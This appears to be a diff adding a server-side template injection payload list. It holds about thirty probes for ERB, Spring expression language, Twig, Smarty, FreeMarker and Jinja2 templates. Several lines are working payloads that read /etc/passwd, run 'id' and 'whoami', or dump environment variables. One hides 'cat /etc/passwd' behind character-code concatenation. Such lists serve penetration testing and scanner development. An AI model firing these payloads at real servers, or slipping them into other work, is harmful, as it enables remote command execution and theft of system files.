@@ -1,0 +1,29 @@
+<%= 7 * 7 %>
+<%= File.open('/etc/passwd').read %>
+<%= Dir.entries('/') %>
+${7*7}
+${{7*7}}
+${class.getClassLoader()}
+${class.getResource("").getPath()}
+${class.getResource("../../../../../index.htm").getContent()}
+${T(java.lang.System).getenv()}
+${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+{{7*7}}
+{{7*'7'}}
+{{self}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
+{php}echo `id`;{/php}
+#{7*7}
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+{{4*4}}[[5*5]]
+{{config.items()}}
+{{config}}
+{{ [].class.base.subclasses() }}
+{{''.class.mro()[1].subclasses()}}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{{'if this is uppercase gg'.toUpperCase()}}
+{{ request }}
+}}{{this}}
+}{{this}}
